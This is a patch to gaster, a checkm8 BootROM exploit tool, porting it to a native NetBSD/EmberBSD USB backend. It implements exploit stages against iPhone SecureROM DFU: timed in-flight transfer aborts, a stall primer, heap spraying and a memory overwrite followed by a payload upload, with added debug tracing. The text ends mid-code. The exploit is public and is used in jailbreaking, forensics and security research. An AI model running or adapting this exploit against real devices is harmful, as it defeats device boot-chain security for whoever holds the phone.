$NetBSD$
diff --git gaster.c gaster.c
index b52b08d..2345b3b 100644
--- gaster.c
+++ gaster.c
@@ -1,4 +1,5 @@
 /* Copyright 2023 0x7ff
+ * Modified for EmberBSD native USB timeout and thread synchronization.
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -19,6 +20,23 @@
 #	include <stdbool.h>
 #	include <string.h>
 #	include <stddef.h>
+#elif defined(GASTER_NETBSD_NATIVE)
+#	include <dev/usb/usb.h>
+#	include <openssl/evp.h>
+#	include <fcntl.h>
+#	include <limits.h>
+#	include <pthread.h>
+#	include <sched.h>
+#	include <stdatomic.h>
+#	include <sys/ioctl.h>
+#	include <unistd.h>
+#	include <errno.h>
+#	include <string.h>
+#	include <stdbool.h>
+#	include <stddef.h>
+#	ifndef USB_ABORT_REQUEST
+#		define USB_ABORT_REQUEST _IO('U', 118)
+#	endif
 #else
 #	include <CommonCrypto/CommonCrypto.h>
 #	include <CoreFoundation/CoreFoundation.h>
@@ -120,6 +138,9 @@ typedef struct {
 	uint16_t vid, pid;
 #ifdef HAVE_LIBUSB
 	struct libusb_device_handle *device;
+#elif defined(GASTER_NETBSD_NATIVE)
+	int fd;
+	int bus;
 #else
 	io_service_t serv;
 	IOUSBDeviceInterface320 **device;
@@ -164,6 +185,7 @@ static der_item_spec_t der_img4_item_specs[] = {
 	{ 5, DER_SEQ, DER_FLAG_OPTIONAL }
 };
 static unsigned usb_timeout, usb_abort_timeout_min;
+static int gaster_dbg_sync_errno, gaster_dbg_async_errno;
 static struct {
 	uint8_t b_len, b_descriptor_type;
 	uint16_t bcd_usb;
@@ -246,6 +268,28 @@ send_usb_control_request_async(const usb_handle_t *handle, uint8_t bm_request_ty
 	int completed = 0;
 	uint8_t *buf;
 
+#ifdef GASTER_NETBSD_SYNC
+	/* The synchronous NetBSD libusb backend cannot cancel an in-flight
+	 * control transfer, but the kernel aborts a request at the per-request
+	 * timeout.  Use that timeout as the checkm8 abort primitive and map
+	 * the completion like the async callback would. */
+	{
+		int ret = libusb_control_transfer(handle->device, bm_request_type, b_request, w_value, w_index, p_data, (uint16_t)w_len, usb_abort_timeout);
+
+		if(transfer_ret != NULL) {
+			transfer_ret->sz = 0;
+			if(ret >= 0) {
+				transfer_ret->sz = (uint32_t)ret;
+				transfer_ret->ret = USB_TRANSFER_OK;
+			} else if(ret == LIBUSB_ERROR_PIPE) {
+				transfer_ret->ret = USB_TRANSFER_STALL;
+			} else {
+				transfer_ret->ret = USB_TRANSFER_ERROR;
+			}
+		}
+		return true;
+	}
+#else
 	if(transfer != NULL) {
 		if((buf = malloc(LIBUSB_CONTROL_SETUP_SIZE + w_len)) != NULL) {
 			if((bm_request_type & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_OUT) {
@@ -279,6 +323,7 @@ send_usb_control_request_async(const usb_handle_t *handle, uint8_t bm_request_ty
 		}
 		libusb_free_transfer(transfer);
 	}
+#endif
 	return completed != 0;
 }
 
@@ -288,6 +333,374 @@ init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
 	handle->pid = pid;
 	handle->device = NULL;
 }
+#elif defined(GASTER_NETBSD_NATIVE)
+/* Native NetBSD/EmberBSD backend: direct ugen(4) ioctls, no libusb.
+ * Control requests run on the endpoint-0 descriptor; the kernel
+ * USB_ABORT_REQUEST ioctl aborts an in-flight request, which provides
+ * the checkm8 abort primitive. */
+
+static void
+init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
+	handle->vid = vid;
+	handle->pid = pid;
+	handle->fd = -1;
+	handle->bus = 0;
+}
+
+static void
+close_usb_handle(usb_handle_t *handle) {
+	if(handle->fd >= 0) {
+		close(handle->fd);
+		handle->fd = -1;
+	}
+}
+
+static int
+_roothub_request(int fd, uint8_t type, uint8_t request, uint16_t value,
+    uint16_t index, uint16_t length, void *data) {
+	struct usb_ctl_request req;
+
+	memset(&req, 0, sizeof(req));
+	req.ucr_addr = 0; /* root hub */
+	req.ucr_request.bmRequestType = type;
+	req.ucr_request.bRequest = request;
+	USETW(req.ucr_request.wValue, value);
+	USETW(req.ucr_request.wIndex, index);
+	USETW(req.ucr_request.wLength, length);
+	req.ucr_data = data;
+	req.ucr_flags = USBD_SHORT_XFER_OK;
+
+	return ioctl(fd, USB_REQUEST, &req);
+}
+
+static int gaster_skip_reset;
+static int gaster_fork_phase3;
+static unsigned usb_poll_interval_ms;
+static int gaster_ugen_unit = -1;
+static int gaster_enxio_heal = 0;
+
+static bool
+configure_usb_poll_interval(void)
+{
+	const char *setting = getenv("USB_POLL_INTERVAL_MS");
+	unsigned interval = 0;
+
+	usb_poll_interval_ms = usb_timeout;
+	if (setting == NULL)
+		return true;
+	for (; *setting != '\0'; setting++) {
+		if (*setting < '0' || *setting > '9')
+			return false;
+		interval = interval * 10 + (unsigned)(*setting - '0');
+		if (interval > 1000)
+			return false;
+	}
+	if (interval == 0)
+		return false;
+	usb_poll_interval_ms = interval;
+	return true;
+}
+
+/* A DFU device between checkm8 stages waits for a host port reset
+ * before it enumerates again.  Reset every connected root port of the
+ * device bus: this is the libusb_reset_device semantic for directly
+ * attached devices and it also heals wedged (connected but disabled)
+ * ports. */
+static void
+reset_usb_handle(const usb_handle_t *handle) {
+	/* Only reset WEDGED ports (connected but not enabled).
+	 * Resetting healthy ports crashes the USB controller after
+	 * repeated use. Wedged ports need one reset to re-enable. */
+	unsigned char buf[16];
+	char node[16];
+	int fd, port, nports;
+
+	snprintf(node, sizeof(node), "/dev/usb%d", handle->bus);
+	fd = open(node, O_RDWR);
+	if(fd < 0) {
+		return;
+	}
+	memset(buf, 0, sizeof(buf));
+	if(_roothub_request(fd, 0xa0, 0x06, 0x2900, 0, sizeof(buf), buf) == 0) {
+		nports = buf[2];
+		for(port = 1; port <= nports; port++) {
+			uint16_t status;
+
+			memset(buf, 0, sizeof(buf));
+			if(_roothub_request(fd, 0xa3, 0x00, 0, port, 4, buf) < 0) {
+				continue;
+			}
+			status = buf[0] | (buf[1] << 8);
+			if((status & 0x0001) != 0 && (status & 0x0002) == 0) {
+				fprintf(stderr, "[reset] wedged port %d, re-enabling\n", port);
+				_roothub_request(fd, 0x23, 0x03, 0x0004, port, 0, NULL);
+			}
+		}
+	}
+	close(fd);
+}
+
+static bool
+wait_usb_handle(usb_handle_t *handle, usb_check_cb_t usb_check_cb, void *arg) {
+	struct usb_device_info di;
+	char node[16];
+	int fd, i;
+
+	printf("[ugen] Waiting for the USB handle with VID: 0x%" PRIX16 ", PID: 0x%" PRIX16 "\n", handle->vid, handle->pid);
+	for(;;) {
+		for(i = 0; i < 33; i++) {
+			int unit = i < 32 ? i : gaster_ugen_unit;
+
+			if(unit < 0) {
+				continue;
+			}
+			snprintf(node, sizeof(node), "/dev/ugen%d.00", unit);
+			fd = open(node, O_RDWR);
+			if(fd < 0) {
+				/* Port may be wedged (device reset left it disabled).
+				 * Heal once, then wait for re-enumeration. */
+				if(errno == ENXIO && handle->bus >= 0 && gaster_enxio_heal < 3) {
+					gaster_enxio_heal++;
+					fprintf(stderr, "[ugen] healing wedged port (try %d/3)\n", gaster_enxio_heal);
+					reset_usb_handle(handle);
+					sleep_ms(1000);
+				}
+				continue;
+			}
+			if(ioctl(fd, USB_GET_DEVICEINFO, &di) == 0 &&
+			    di.udi_vendorNo == handle->vid && di.udi_productNo == handle->pid) {
+				gaster_ugen_unit = unit;
+				gaster_enxio_heal = 0;
+				/* USB_TIMEOUT and ugen(4) both use milliseconds.
+				 * Clamp to the ioctl's signed range without wrapping. */
+				int request_timeout_ms = usb_timeout > (unsigned)INT_MAX ?
+				    INT_MAX : (int)usb_timeout;
+
+				handle->fd = fd;
+				handle->bus = di.udi_bus;
+				/* The reference flow never sets a configuration:
+				 * configuring first changes how the SecureROM DFU
+				 * answers the exploit's descriptor reads. */
+				if(ioctl(fd, USB_SET_TIMEOUT, &request_timeout_ms) == 0 && (usb_check_cb == NULL || usb_check_cb(handle, arg))) {
+					puts("Found the USB handle.");
+					return true;
+				}
+				close(handle->fd);
+				handle->fd = -1;
+			} else {
+				close(fd);
+			}
+		}
+		sleep_ms(usb_poll_interval_ms);
+	}
+}
+
+static void
+_fill_request(struct usb_ctl_request *req, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len) {
+	memset(req, 0, sizeof(*req));
+	req->ucr_request.bmRequestType = bm_request_type;
+	req->ucr_request.bRequest = b_request;
+	USETW(req->ucr_request.wValue, w_value);
+	USETW(req->ucr_request.wIndex, w_index);
+	USETW(req->ucr_request.wLength, (uint16_t)w_len);
+	req->ucr_data = p_data;
+	req->ucr_flags = USBD_SHORT_XFER_OK;
+}
+
+static bool
+send_usb_control_request(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, transfer_ret_t *transfer_ret) {
+	struct usb_ctl_request req;
+
+	gaster_dbg_sync_errno = 0;
+	_fill_request(&req, bm_request_type, b_request, w_value, w_index, p_data, w_len);
+	if(ioctl(handle->fd, USB_DO_REQUEST, &req) == 0) {
+		if(transfer_ret != NULL) {
+			transfer_ret->sz = (uint32_t)req.ucr_actlen;
+			transfer_ret->ret = USB_TRANSFER_OK;
+		}
+	} else {
+		gaster_dbg_sync_errno = errno;
+		if(transfer_ret != NULL) {
+			transfer_ret->sz = 0;
+			transfer_ret->ret = errno == EPIPE ? USB_TRANSFER_STALL : USB_TRANSFER_ERROR;
+		}
+	}
+	return true;
+}
+
+typedef struct {
+	int fd;
+	struct usb_ctl_request req;
+	atomic_int started;
+	atomic_int done;
+	int ret;
+	int err;
+} netbsd_async_ctx_t;
+
+static void *
+_netbsd_request_thread(void *arg) {
+	netbsd_async_ctx_t *ctx = arg;
+
+	atomic_store_explicit(&ctx->started, 1, memory_order_release);
+	ctx->ret = ioctl(ctx->fd, USB_DO_REQUEST, &ctx->req);
+	ctx->err = errno;
+	atomic_store_explicit(&ctx->done, 1, memory_order_release);
+	return NULL;
+}
+
+/* The kernel tick is 10 ms, but checkm8 aborts need 1-4 ms precision:
+ * busy-wait instead of sleeping. */
+static void
+spin_ms(unsigned ms) {
+	struct timespec start, now;
+	uint64_t target = (uint64_t)ms * 1000000u;
+
+	clock_gettime(CLOCK_MONOTONIC, &start);
+	do {
+		clock_gettime(CLOCK_MONOTONIC, &now);
+	} while((uint64_t)(now.tv_sec - start.tv_sec) * 1000000000u +
+	    (uint64_t)now.tv_nsec - (uint64_t)start.tv_nsec < target);
+}
+
+/* Busy-wait with microsecond granularity; the kernel tick cannot
+ * provide cancel deadlines this short. */
+static void
+spin_us(unsigned us) {
+	struct timespec start, now;
+	uint64_t target = (uint64_t)us * 1000u;
+
+	clock_gettime(CLOCK_MONOTONIC, &start);
+	do {
+		clock_gettime(CLOCK_MONOTONIC, &now);
+	} while((uint64_t)(now.tv_sec - start.tv_sec) * 1000000000u +
+	    (uint64_t)now.tv_nsec - (uint64_t)start.tv_nsec < target);
+}
+
+static bool
+send_usb_control_request_async(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, unsigned usb_abort_timeout, transfer_ret_t *transfer_ret) {
+	netbsd_async_ctx_t ctx;
+	pthread_t thread;
+	int error;
+
+	gaster_dbg_async_errno = 0;
+	if(transfer_ret != NULL) {
+		transfer_ret->ret = USB_TRANSFER_ERROR;
+		transfer_ret->sz = 0;
+	}
+	ctx.fd = handle->fd;
+	ctx.ret = -1;
+	ctx.err = 0;
+	atomic_init(&ctx.started, 0);
+	_fill_request(&ctx.req, bm_request_type, b_request, w_value, w_index, p_data, w_len);
+
+	error = pthread_create(&thread, NULL, _netbsd_request_thread, &ctx);
+	if(error != 0) {
+		gaster_dbg_async_errno = error;
+		return false;
+	}
+	while(atomic_load_explicit(&ctx.started, memory_order_acquire) == 0) {
+		sched_yield();
+	}
+	if(usb_abort_timeout == 0) {
+		/* Reference semantics: cancel immediately after
+		 * submission, exactly once. */
+		ioctl(handle->fd, USB_ABORT_REQUEST);
+	} else {
+		spin_ms(usb_abort_timeout);
+		/*
+		 * The abort is a no-op while the request has not entered
+		 * the kernel yet: retry briefly so a slow submission still
+		 * gets cancelled at the intended deadline instead of
+		 * running into the coarse kernel timeout.
+		 */
+		for(error = 0; error < 4 && !ctx.done; error++) {
+			ioctl(handle->fd, USB_ABORT_REQUEST);
+			spin_ms(1);
+		}
+		ioctl(handle->fd, USB_ABORT_REQUEST);
+	}
+	error = pthread_join(thread, NULL);
+	if(error != 0) {
+		/* The worker may still use ctx. Do not return with live stack data. */
+		fprintf(stderr, "pthread_join: %s\n", strerror(error));
+		abort();
+	}
+
+	if(transfer_ret != NULL) {
+		transfer_ret->sz = 0;
+		if(ctx.ret == 0) {
+			transfer_ret->sz = (uint32_t)ctx.req.ucr_actlen;
+			transfer_ret->ret = USB_TRANSFER_OK;
+		} else if(ctx.err == EPIPE) {
+			transfer_ret->ret = USB_TRANSFER_STALL;
+		} else {
+			transfer_ret->ret = USB_TRANSFER_ERROR; /* includes ECANCELED aborts */
+		}
+	}
+	gaster_dbg_async_errno = ctx.err;
+	return true;
+}
+
+/* Submit a control request and cancel it in flight with hammer aborts:
+ * the first abort that lands after the actual submission cancels the
+ * transfer close to its start, like the reference 0.1 ms deadline. */
+static void
+checkm8_hammer_cancel_delay(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, size_t w_len, unsigned cancel_delay_us, transfer_ret_t *transfer_ret) {
+	static char data[0x800];
+	netbsd_async_ctx_t ctx;
+	pthread_t thread;
+
+	gaster_dbg_async_errno = 0;
+	ctx.fd = handle->fd;
+	ctx.ret = -1;
+	ctx.err = 0;
+	atomic_init(&ctx.started, 0);
+	atomic_init(&ctx.done, 0);
+	_fill_request(&ctx.req, bm_request_type, b_request, w_value, w_index, data, w_len);
+
+	if(pthread_create(&thread, NULL, _netbsd_request_thread, &ctx) != 0) {
+		return;
+	}
+	while(atomic_load_explicit(&ctx.started, memory_order_acquire) == 0) {
+		sched_yield();
+	}
+	if(cancel_delay_us != 0) {
+		spin_us(cancel_delay_us);
+	}
+	/* Tight abort loop, no yield: scheduler pauses would move the
+	 * effective cancel point and make the primer depth random. */
+	while(!atomic_load_explicit(&ctx.done, memory_order_acquire)) {
+		ioctl(handle->fd, USB_ABORT_REQUEST);
+	}
+	pthread_join(thread, NULL);
+
+	if(transfer_ret != NULL) {
+		transfer_ret->sz = 0;
+		if(ctx.ret == 0) {
+			transfer_ret->sz = (uint32_t)ctx.req.ucr_actlen;
+			transfer_ret->ret = USB_TRANSFER_OK;
+		} else if(ctx.err == EPIPE) {
+			transfer_ret->ret = USB_TRANSFER_STALL;
+		} else {
+			transfer_ret->ret = USB_TRANSFER_ERROR;
+		}
+	}
+	gaster_dbg_async_errno = ctx.err;
+}
+
+static void
+checkm8_hammer_cancel(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, size_t w_len, transfer_ret_t *transfer_ret) {
+	checkm8_hammer_cancel_delay(handle, bm_request_type, b_request, w_value, w_index, w_len, 0, transfer_ret);
+}
+
+/* ipwndfu stall(): an async 0xC0 string read canceled after tens of
+ * microseconds.  On this device the (2,3,0x80) primer silences the ROM
+ * entirely, while this form leaves the responsive corrupted state the
+ * leaks need. */
+static void
+checkm8_stall_async_prime(const usb_handle_t *handle, transfer_ret_t *transfer_ret) {
+	checkm8_hammer_cancel(handle, 0x80, 6, 0x0304, 0x040A, 0xC0, transfer_ret);
+}
 #else
 static void
 cf_dictionary_set_int16(CFMutableDictionaryRef dict, const void *key, uint16_t val) {
@@ -501,18 +914,48 @@ get_usb_serial_number(usb_handle_t *handle) {
 	char *str = NULL;
 	size_t i, sz;
 
-	if(send_usb_control_request(handle, 0x80, 6, 1U << 8U, 0, &device_descriptor, sizeof(device_descriptor), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(device_descriptor) && send_usb_control_request(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 0x409, buf, sizeof(buf), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == buf[0] && (sz = buf[0] / 2) != 0 && (str = malloc(sz)) != NULL) {
+	bool ok = send_usb_control_request(handle, 0x80, 6, 1U << 8U, 0, &device_descriptor, sizeof(device_descriptor), &transfer_ret);
+	bool ok2 = false;
+
+	if(!ok || transfer_ret.ret != USB_TRANSFER_OK || transfer_ret.sz != sizeof(device_descriptor)) {
+		fprintf(stderr, "[serial] devdesc ok=%d ret=%d sz=%u errno=%d\n", ok, (int)transfer_ret.ret, transfer_ret.sz, gaster_dbg_sync_errno);
+		return NULL;
+	}
+	ok2 = send_usb_control_request(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 0x409, buf, sizeof(buf), &transfer_ret);
+	if(!ok2 || transfer_ret.ret != USB_TRANSFER_OK || transfer_ret.sz != buf[0]) {
+		fprintf(stderr, "[serial] string ok=%d ret=%d sz=%u errno=%d\n", ok2, (int)transfer_ret.ret, transfer_ret.sz, gaster_dbg_sync_errno);
+		return NULL;
+	}
+	if((sz = buf[0] / 2) != 0 && (str = malloc(sz)) != NULL) {
 		for(i = 0; i < sz; ++i) {
 			str[i] = (char)buf[2 * (i + 1)];
 		}
 		str[sz - 1] = '\0';
+		fprintf(stderr, "[serial] '%s'\n", str);
 	}
 	return str;
 }
 
+static int gaster_serial_fails = 0;
+
 static bool
 checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 	char *usb_serial_num = get_usb_serial_number(handle);
+
+	/* After an exploit attempt the heap may be too corrupted for
+	 * descriptor reads. The device IS in DFU; proceed with the
+	 * attempt instead of retrying the serial read forever. */
+	if(usb_serial_num == NULL) {
+		gaster_serial_fails++;
+		if(gaster_serial_fails >= 3) {
+			fprintf(stderr, "[serial] unreadable after %d tries, proceeding\n", gaster_serial_fails);
+			gaster_serial_fails = 0;
+			*(bool *)pwned = false;
+			return true;
+		}
+		return false;
+	}
+	gaster_serial_fails = 0;
 	bool ret = false;
 
 	if(usb_serial_num != NULL) {
@@ -823,6 +1266,14 @@ dfu_check_status(const usb_handle_t *handle, uint8_t status, uint8_t state) {
 	} dfu_status;
 	transfer_ret_t transfer_ret;
 
+	if(getenv("GASTER_DFUDUMP") != NULL) {
+		bool ok = send_usb_control_request(handle, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status), &transfer_ret);
+
+		fprintf(stderr, "[dfu] want status=%u state=%u: ret=%d sz=%u errno=%d got status=%u state=%u\n",
+		    status, state, (int)transfer_ret.ret, transfer_ret.sz,
+		    gaster_dbg_sync_errno, dfu_status.status, dfu_status.state);
+		return ok && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(dfu_status) && dfu_status.status == status && dfu_status.state == state;
+	}
 	return send_usb_control_request(handle, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(dfu_status) && dfu_status.status == status && dfu_status.state == state;
 }
 
@@ -846,11 +1297,24 @@ checkm8_stage_reset(const usb_handle_t *handle) {
 
 static bool
 checkm8_stage_setup(const usb_handle_t *handle) {
-	unsigned usb_abort_timeout = usb_timeout - 1;
+	/* The t=1 abort wins on every observed iPhone6,2 run; starting
+	 * there avoids three one-second timeout misses while the primed
+	 * ROM watchdog runs.  The cycle still explores other timings on
+	 * failure. */
+	unsigned usb_abort_timeout = 1;
 	transfer_ret_t transfer_ret;
 
 	for(;;) {
-		if(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < config_overwrite_pad && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
+		transfer_ret_t async_ret = { USB_TRANSFER_ERROR, 0 };
+		bool ok = send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &async_ret);
+		bool sz_ok = ok && async_ret.sz < config_overwrite_pad;
+		bool sync_ok = false;
+
+		if(sz_ok) {
+			sync_ok = send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - async_ret.sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL;
+		}
+		fprintf(stderr, "[setup] t=%u async=%d/%u/%d sz_ok=%d sync=%d/%d\n", usb_abort_timeout, (int)async_ret.ret, async_ret.sz, gaster_dbg_async_errno, sz_ok, sz_ok ? (int)transfer_ret.ret : -1, sz_ok ? gaster_dbg_sync_errno : 0);
+		if(sz_ok && sync_ok) {
 			return true;
 		}
 		send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL);
@@ -862,8 +1326,10 @@ checkm8_stage_setup(const usb_handle_t *handle) {
 static bool
 checkm8_usb_request_leak(const usb_handle_t *handle) {
 	transfer_ret_t transfer_ret;
+	bool ok = send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret);
 
-	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret) && transfer_ret.sz == 0;
+	fprintf(stderr, "[leak] ok=%d ret=%d sz=%u errno=%d\n", ok, (int)transfer_ret.ret, transfer_ret.sz, gaster_dbg_async_errno);
+	return ok && transfer_ret.sz == 0;
 }
 
 static void
@@ -872,18 +1338,27 @@ checkm8_stall(const usb_handle_t *handle) {
 	transfer_ret_t transfer_ret;
 
 	for(;;) {
+		fprintf(stderr, "[stall] attempt t=%u\n", usb_abort_timeout);
 		if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ && checkm8_usb_request_leak(handle)) {
 			break;
 		}
+		fprintf(stderr, "[stall] t=%u async=%d/%u/%d\n", usb_abort_timeout, (int)transfer_ret.ret, transfer_ret.sz, gaster_dbg_async_errno);
 		usb_abort_timeout = (usb_abort_timeout + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;
 	}
 }
 
+static int gaster_noleak_count;
+
 static bool
 checkm8_no_leak(const usb_handle_t *handle) {
 	transfer_ret_t transfer_ret;
+	bool ok = send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ + 1, 1, &transfer_ret);
 
-	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ + 1, 1, &transfer_ret) && transfer_ret.sz == 0;
+	if (gaster_noleak_count < 12) {
+		fprintf(stderr, "[noleak#%d] ok=%d ret=%d sz=%u errno=%d\n", gaster_noleak_count, ok, (int)transfer_ret.ret, transfer_ret.sz, gaster_dbg_async_errno);
+	}
+	gaster_noleak_count++;
+	return ok && transfer_ret.sz == 0;
 }
 
 static bool
@@ -902,17 +1377,36 @@ checkm8_stage_spray(const usb_handle_t *handle) {
 			while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
 		} else {
 			checkm8_stall(handle);
+			fprintf(stderr, "[spray] stall done, hole=%zu large_leak=%zu\n", config_hole, config_large_leak);
 			for(i = 0; i < config_hole; ++i) {
-				while(!checkm8_no_leak(handle)) {}
+				unsigned tries = 0;
+
+				while(!checkm8_no_leak(handle)) {
+					if((++tries & 7) == 0) {
+						fprintf(stderr, "[noleak] i=%zu tries=%u last_async_errno=%d\n", i, tries, gaster_dbg_async_errno);
+					}
+				}
 			}
 			while(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
 		}
 		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
 	} else {
+		struct timespec spray_t0, spray_t1;
+
+		clock_gettime(CLOCK_MONOTONIC, &spray_t0);
 		for(i = 0; i < config_large_leak; ++i) {
 			while(!checkm8_usb_request_stall(handle)) {}
+			if((i & 0x3FF) == 0) {
+				clock_gettime(CLOCK_MONOTONIC, &spray_t1);
+				fprintf(stderr, "[spray] stall loop %zu/%zu elapsed=%lldms\n",
+				    i, config_large_leak,
+				    (long long)((spray_t1.tv_sec - spray_t0.tv_sec) * 1000 +
+				    (spray_t1.tv_nsec - spray_t0.tv_nsec) / 1000000));
+			}
 		}
+		fprintf(stderr, "[spray] stall loop DONE (%zu), clrstatus\n", config_large_leak);
 		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
+		fprintf(stderr, "[spray] stage complete\n");
 	}
 	return true;
 }
@@ -1208,18 +1702,56 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				overwrite = &checkm8_overwrite_armv7;
 				overwrite_sz = sizeof(checkm8_overwrite_armv7);
 			}
+			if(gaster_fork_phase3 && overwrite != NULL) {
+				/* Community A7 carrier: the reference fork sends the
+				 * overwrite through a (0,0) request instead of the
+				 * stall carrier, a request class every host handles. */
+				int t50 = 50;
+
+				fprintf(stderr, "[patch] fork: stall req\n");
+				send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, &transfer_ret);
+				fprintf(stderr, "[patch] fork: leak req\n");
+				send_usb_control_request_async_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x40, 1, &transfer_ret);
+#ifdef GASTER_NETBSD_NATIVE
+				(void)ioctl(handle->fd, USB_SET_TIMEOUT, &t50);
+#endif
+				fprintf(stderr, "[patch] fork: overwrite %zu bytes\n", overwrite_sz);
+				(void)send_usb_control_request(handle, 0, 0, 0, 0, overwrite, overwrite_sz, &transfer_ret);
+				fprintf(stderr, "[patch] fork: payload %zu bytes\n", data_sz);
+				for(i = 0; i < data_sz; i += packet_sz) {
+					packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
+					(void)send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
+				}
+				fprintf(stderr, "[patch] fork phase 3 sent %zu bytes\n", data_sz);
+				free(data);
+				return true;
+			}
+			if(overwrite == NULL) {
+				fprintf(stderr, "[patch] no overwrite, cpid=%04X\n", cpid);
+			}
 			if(overwrite != NULL && send_usb_control_request(handle, 2, 3, 0, 0x80, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
 				ret = true;
 				for(i = 0; ret && i < data_sz; i += packet_sz) {
+					transfer_ret_t pkt_ret;
+
 					packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
-					ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
+					ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, &pkt_ret);
+					if(!ret || pkt_ret.ret != USB_TRANSFER_OK || pkt_ret.sz != packet_sz) {
+						fprintf(stderr, "[patch] packet %zu/%zu ret=%d sz=%u/%zu errno=%d\n",
+						    i, data_sz, (int)pkt_ret.ret, pkt_ret.sz,
+						    packet_sz, gaster_dbg_sync_errno);
+						ret = false;
+					}
 				}
 				if(ret) {
 					send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, NULL);
 					send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
-					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC);
-					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST);
-					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
+					ret = dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC);
+					fprintf(stderr, "[patch] manifest_sync=%d\n", ret);
+					ret = ret && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST);
+					fprintf(stderr, "[patch] manifest=%d\n", ret);
+					ret = ret && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
+					fprintf(stderr, "[patch] manifest_wait_reset=%d\n", ret);
 				}
 			}
 			free(data);
@@ -1228,20 +1760,217 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 	return ret;
 }
 
+enum checkm8_stage {
+	STAGE_RESET,
+	STAGE_SETUP,
+	STAGE_SPRAY,
+	STAGE_PATCH,
+	STAGE_PWNED
+};
+
+static void
+reset_usb_handle_after_stage(const usb_handle_t *handle,
+    enum checkm8_stage completed_stage, bool success) {
+#if defined(GASTER_NETBSD_NATIVE) && !defined(HAVE_LIBUSB)
+	if(completed_stage == STAGE_SPRAY && success &&
+	    getenv("GASTER_SKIP_SPRAY_RESET") != NULL) {
+		puts("GASTER_SKIP_SPRAY_RESET: skipping reset after successful SPRAY.");
+		return;
+	}
+#else
